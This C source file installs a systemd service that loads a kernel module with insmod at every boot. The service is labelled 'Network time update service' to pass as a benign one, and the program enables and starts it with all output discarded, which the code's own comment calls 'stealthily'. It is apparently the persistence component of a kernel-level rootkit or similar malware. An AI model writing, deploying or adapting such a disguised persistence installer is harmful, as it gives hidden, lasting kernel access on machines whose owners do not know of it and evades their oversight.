#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/utsname.h>
#include "config.h"

#define SUCCESS 0
#define ERROR 1

int write_service_file(const char *path)
{
    int ret = SUCCESS;
    struct utsname buffer;
    if (uname(&buffer) != 0)
        return ret;
    char module_path[512];
    snprintf(module_path, sizeof(module_path), MODULE_PATH, buffer.release);
    
    char service_content[1024];  // Make sure buffer is big enough
    snprintf(service_content, sizeof(service_content),
        "[Unit]\n"
        "Description=Network time update service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=/sbin/insmod %s\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        module_path
    );

    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -ERROR;
    ssize_t written = write(fd, service_content, strlen(service_content));
    if (written < 0 || (size_t)written != strlen(service_content))
    {
        PERROR("write failed");
        close(fd);
        return -ERROR;
    }
    close(fd);
    return SUCCESS;
}

int main(int argc, char **argv)
{
    // Write systemd unit file
    int ret = write_service_file(SERVICE_FILE);
    if (ret != SUCCESS)
    {
        unlink(SERVICE_FILE);
        PERROR("write_service_file failed");
        return -ERROR;
    }

    // Enable + start service (stealthily, no stdout)
    ret = system("systemctl enable " SERVICE_NAME " > /dev/null 2>&1");
    // if (ret == -1 || WEXITSTATUS(ret) != 0)
    // {
    //     unlink(SERVICE_FILE);
    //     PERROR("systemctl enable failed");
    //     return ret;
    // }
    ret = system("systemctl start " SERVICE_NAME " > /dev/null 2>&1");
    // if (ret == -1 || WEXITSTATUS(ret) != 0)
    // {
    //     unlink(SERVICE_FILE);
    //     PERROR("systemctl start failed");
    //     return ret;
    // }

    return SUCCESS;
}
